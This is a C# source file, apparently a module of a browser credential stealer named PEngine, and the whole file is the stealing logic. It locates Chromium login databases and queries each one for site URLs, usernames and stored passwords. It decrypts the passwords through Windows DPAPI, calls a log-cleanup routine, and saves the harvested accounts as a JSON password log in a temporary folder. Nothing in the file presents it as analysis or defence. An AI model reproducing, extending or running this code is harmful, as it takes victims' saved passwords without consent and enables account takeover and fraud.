namespace PEngine.Engine.Browsers.Chromium
{
    using Newtonsoft.Json;
    using PEngine.Helpers;
    using PEngine.Main;
    using System;
    using System.Collections.Generic;
    using System.Data.SQLite;
    using System.IO;
    using System.Security.Cryptography;

    public class GetPassword
    {
        private static HashSet<BaseAccount> _Logs = new HashSet<BaseAccount>();

        private static byte[] GetBytes(SQLiteDataReader reader, int ordinal)
        {
            byte[] result = null;

            if (!reader.IsDBNull(ordinal))
            {
                long bytesRead = 0, size = reader.GetBytes(ordinal, 0, null, 0, 0);
                result = new byte[size];
                int curPos = 0, bufferSize = size > int.MaxValue ? int.MaxValue : (int)size;
                while (bytesRead < size)
                {
                    bytesRead += reader.GetBytes(ordinal, curPos, result, curPos, bufferSize);
                    curPos += bufferSize;
                }
            }
            return result;
        }

        public static void Inizialize()
        {
            _Logs.Clear();
            for (int i = 0; i < ChromeSearcher.GetLogins.Count; i++)
            {
                int SafeIndex = i;
                if (File.Exists(ChromeSearcher.GetLogins[SafeIndex]))
                {
                    try
                    {
                        using (var Connect = new SQLiteConnection($"Data Source={ChromeSearcher.GetLogins[SafeIndex]};Version=3;New=False;Compress=True;"))
                        {
                            Connect.Open();
                            using (var ComText = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", Connect))
                            {
                                using (SQLiteDataReader reader = ComText.ExecuteReader())
                                {
                                    if (reader.HasRows)
                                    {
                                        while (reader.Read())
                                        {
                                            _Logs.Add(new BaseAccount
                                            {
                                                BrowserName = Path.GetFileNameWithoutExtension(ChromeSearcher.GetLogins[SafeIndex]),
                                                Url = (string)reader["origin_url"],
                                                User = (string)reader["username_value"],
                                                Pass = ChromeDecrypt.DecryptValue(GetBytes(reader, 2), DataProtectionScope.LocalMachine)
                                            });
                                        }
                                    }
                                    else
                                    {
                                        continue;
                                    }
                                }
                            }
                            SQLiteConnection.ClearPool(Connect);
                        }
                    }
                    catch (SQLiteException) { continue; }
                    catch (FormatException) { continue; }
                    catch (ArgumentException) { continue; }
                    catch (IndexOutOfRangeException) { continue; }
                    catch (DllNotFoundException) { continue; }
                }
            }
            Ccleaner.DeltaLogs("Logins");
            var b = new Wrapper
            {
                Browsers = _Logs
            };
            if (File.Exists(CombineEx.Combination(GlobalPath.GarbageTemp, "Newtonsoft.Json.dll")))
            {
                SaveData.SaveFile(GlobalPath.PasswordLog, JsonConvert.SerializeObject(b, Formatting.Indented));
            }
        }
    }
}